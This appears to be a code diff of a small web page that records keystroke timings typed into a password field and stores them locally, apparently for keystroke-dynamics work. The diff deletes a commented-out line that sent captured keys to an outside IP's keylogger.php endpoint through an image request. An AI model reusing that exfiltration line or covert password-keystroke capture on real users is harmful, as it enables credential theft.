@@ -1,25 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 </head>
 <body>
 
-	<h1>Key Logs</h1>
+    <h1>Key Logs</h1>
 
-	<input type="password" id = "text">
+    <input type="password" id = "text">
     <p id="demo"></p>
-	
+    <button onclick="records()">Submit</button>
 
 <script>
 
-var buffer = [];
+var buffer = [] ;
 var oldstroke = new Object();
 var newstroke = new Object();
 var downbuffer =[];
 var upbuffer =[];
 
- //document.getElementById("demo").value = "";
+
+var records=function()
+{
+  localStorage.setItem("keylogs", JSON.stringify(buffer));
+  console.log(localStorage.getItem("keylogs"));
+}
 
 document.getElementById("text").onkeydown = function(e) {
 
@@ -30,9 +35,10 @@ document.getElementById("text").onkeydown = function(e) {
         time: timestamp
 
     };
-    //var data = encodeURIComponent(JSON.stringify(buffer));
+    
     if(stroke["key"] == "Backspace")
-    {
+    {   
+        
         buffer = [];
         downbuffer=[];
         upbuffer=[];
@@ -69,13 +75,24 @@ document.getElementById("text").onkeyup = function(e) {
         upbuffer.push(stroke);
         var up = upbuffer.shift();
         var down = downbuffer.shift();
+        /*
+        ft   = flight time
+        kft = key press plus flight time
+        time = key press time
+
+
+        */
+
+    
         var ftime=-(oldstroke.time-down.time);
         if (ftime<0)
         {
             ftime=0;
         }
-
-
+        if (buffer.length==0)
+        {
+            ftime=null;
+        }
 
         oldstroke=up;
 
@@ -85,19 +102,19 @@ document.getElementById("text").onkeyup = function(e) {
         
         stroke.key=down.key;
         stroke.kftime=kftime;
-        //console.log(JSON.stringify(newstroke));
+       
         stroke.time=time;
         stroke.ftime=ftime;
-        //oldstroke = newstroke;
+    
         buffer.push(stroke);
-        console.log(JSON.stringify(buffer));
+        
 
 
     }
 
 
     window.setInterval(function(){
-    //new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
+
         document.getElementById("demo").innerHTML = JSON.stringify(buffer);
 
     }, 1000);
@@ -111,3 +128,5 @@ document.getElementById("text").onkeyup = function(e) {
 </script>
 </body>
 </html>
+
+
